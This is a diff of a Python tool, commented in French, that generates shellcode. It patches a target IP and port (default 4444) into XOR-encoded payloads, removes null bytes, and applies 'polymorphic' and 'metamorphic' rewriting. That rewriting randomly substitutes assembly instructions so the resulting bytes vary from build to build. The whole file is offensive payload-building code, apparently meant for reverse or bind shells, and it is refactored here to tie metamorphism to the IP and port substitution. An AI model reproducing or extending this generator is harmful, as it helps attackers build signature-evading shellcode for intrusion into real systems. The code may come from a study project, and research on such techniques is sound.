@@ -21,16 +21,18 @@ def polymorphisme(verbose, shellcode, programmeAsm_Path, size):
         print(shellPoly)
 
     print("<---------- Creation du shellCode permettant le dechiffrement ---------->")
-    resultfinal = shellcodeCreation(1,  "decompileur", programmeAsm_Path, 0)
+    resultfinal = shellcodeCreation(
+        verbose,  "decompileur", programmeAsm_Path, 0)
     for i in range(2, len(resultfinal), 4):
         if resultfinal[i:i+2] == "00":
-            print("Il y a un ou plusieurs NullBytes  " +
-                  resultfinal[i:i+2] + ", Changement en 0x01")
             tmp = resultfinal[0:i-2]
             tmp += "\\x01"
             tmp += resultfinal[i+2:]
             resultfinal = tmp
         elif resultfinal[i:i+2] == "57":
+            print(
+                "<---------- Changement de la taille du shellcode dans decompileur.asm ---------->")
+            print("Taille du shellcode : "+size)
             tmp = resultfinal[0:i-2]
             tmp += "\\x" + hex(int(size)).split("x")[1]
             tmp += resultfinal[i+2:]
@@ -159,14 +161,9 @@ def xorFinder(verbose, ip):
     return xor_byte
 
 
-def creationShellcodeModified(verbose, ip, shellcode, port):
+def creationShellcodeModified(verbose, ip, shellcode, port, xor_byte):
     print("<---------- Modification du shellcode avec une nouveau port et/ou une nouvelle IP ---------->")
-    if(not port):
-        port = "0xb315"  # 4444
-    if(not ip):
-        ip = bytes(b'\x7f\x00\x00\x01')  # 127.0.0.1
 
-    xor_byte = xorFinder(verbose, ip)
     shellcode = xorInsert(verbose, shellcode, xor_byte)
     shellcode = ipInsert(verbose, ip, shellcode, xor_byte)
     shellcode = portInsert(verbose, shellcode, port)
@@ -182,12 +179,14 @@ def xorChanger(verbose, line, test, file):
             if(random.randint(0, 1)):
                 file.write("and " + test[2] + ", " + str("0x01010101") +
                            "\nand " + test[2] + ", " + str("0x02020202")+"\n")
-                print("Changement de "+line+" en and " + test[2] + ", " + str("0x01010101") +
-                      " and " + test[2] + ", " + str("0x02020202"))
+                if(verbose == 3):
+                    print("Changement de "+line+" en and " + test[2] + ", " + str("0x01010101") +
+                          " and " + test[2] + ", " + str("0x02020202"))
                 return True
             elif(random.randint(0, 1)):
-                print("Changement de "+line+" en sub " +
-                      test[2] + ", " + test[2])
+                if(verbose == 3):
+                    print("Changement de "+line+" en sub " +
+                          test[2] + ", " + test[2])
                 file.write("sub " + test[2] + ", " + test[2]+"\n")
                 return True
     return False
@@ -202,7 +201,7 @@ def movChanger(verbose, line, test, file):
                         value = hex(int(test[2], 16)+1)
                         if(len(value) == 3):
                             value = "0x0"+value[2]
-                        if(verbose):
+                        if(verbose) == 3:
                             print("Changement de "+line+" en mov " +
                                   test[1][:-1] + ", "+value+"dec " + test[1][:-1])
                         file.write(
@@ -213,7 +212,7 @@ def movChanger(verbose, line, test, file):
                         value = hex(int(test[2], 16)-1)
                         if(len(value) == 3):
                             value = "0x0"+value[2]
-                        if(verbose):
+                        if(verbose == 3):
                             print("Changement de "+line+" en mov " +
                                   test[1][:-1] + ", "+value+"inc " + test[1][:-1])
                         file.write(
@@ -222,7 +221,7 @@ def movChanger(verbose, line, test, file):
     return False
 
 
-def metamorphisme(verbose, programme_Name, programme_Path):
+def metamorphisme(verbose, programme_Name, programme_Path, port, ip, xor_byte):
     print("<---------- Creation du shellCode metamorphique ---------->")
     with open(programme_Path+programme_Name+".asm") as f:
         datafile = f.readlines()
@@ -231,6 +230,31 @@ def metamorphisme(verbose, programme_Name, programme_Path):
     with open(programme_Path+programme_Name+"_metamorph.asm", "w") as file:
         for line in datafile:
             test = line.split()
+            if len(test) == 3:
+                if(test[2] == "0x5c11"):
+                    test[2] = port
+
+                if(test[2] == "0xffffffff"):
+                    hex_xor_byte = "0"+hex(xor_byte)[2]
+                    hex_xor_byte = "0" + \
+                        hex(xor_byte)[1:2]+hex_xor_byte + \
+                        hex_xor_byte+hex_xor_byte+hex_xor_byte
+                    test[2] = hex_xor_byte
+
+                if(test[2] == "0xfeffff80"):
+                    ip_bytes = []
+                    ip_byte_clear = "0x"
+                    for i in range(0, 4):
+                        if(len(hex(ip[i] ^ xor_byte)) == 3):
+                            ip_bytes.append("0"+hex(ip[i] ^ xor_byte)[2:4])
+                        else:
+                            ip_bytes.append(hex(ip[i] ^ xor_byte)[2:4])
+                    ip_byte_clear += ip_bytes[3]
+                    ip_byte_clear += ip_bytes[2]
+                    ip_byte_clear += ip_bytes[1]
+                    ip_byte_clear += ip_bytes[0]
+                    test[2] = ip_byte_clear
+
             if(not xorChanger(verbose, line, test, file) and not movChanger(verbose, line, test, file)):
                 file.write(line)
 
@@ -266,7 +290,6 @@ def cleanOpCode(verbose, programme_Path, programme_Name, metamorphismeSelected):
     nbrLine = 0
     nullByte = 0
     if(metamorphismeSelected):
-        metamorphisme(verbose, programme_Name, programme_Path)
         programme_Name += "_metamorph"
     for res in objdump(verbose, programme_Path, programme_Name):
         nullByte += CheckNullBytes(res, nbrLine)
@@ -297,7 +320,6 @@ def shellcodeCreation(verbose, programme_Name, programme_Path, metamorphismeSele
     if(verbose):
         print(exploit)
         print("Taille de l'exploit : "+str(int(len(resultfinal)/2)))
-        print("Taille de l'exploit : "+str(int(len(exploit)/4)))
     return exploit
 
 
@@ -308,8 +330,15 @@ def all(verbose, programmeC_Name, programmeC_Path, port, ip, metamorphismeSelect
     programmeC_Path = programmeC_Path[0]+"c"+programmeC_Path[1]
 
     if(port or ip):
+        if(not port):
+            port = "0x5c11"  # 4444
+        if(not ip):
+            ip = bytes(b'\x7f\x00\x00\x01')  # 127.0.0.1
+        xor_byte = xorFinder(verbose, ip)
         modifiedShellcode = creationShellcodeModified(
-            verbose, ip, shellcode, port)
+            verbose, ip, shellcode, port, xor_byte)
+        if(metamorphismeSelected):
+            metamorphisme(verbose, programmeC_Name, "asm/", port, ip, xor_byte)
         if(polymorphismSelected):
             size = str(int(len(modifiedShellcode)/4))
             shellcode = polymorphisme(verbose, modifiedShellcode, "asm/", size)
@@ -534,8 +563,9 @@ def main():
             shellcode = shellcodeCreation(
                 menuResult[3], arrayName[0], arrayName[1], menuResult[9])
             if(menuResult[5] or menuResult[7]):
+                xor_byte = xorFinder(menuResult[3], ip)
                 shellcode = creationShellcodeModified(
-                    menuResult[3], ip, shellcode, port)
+                    menuResult[3], ip, shellcode, port, xor_byte)
             if(not menuResult[3]):
                 print(shellcode)
             if(menuResult[10]):
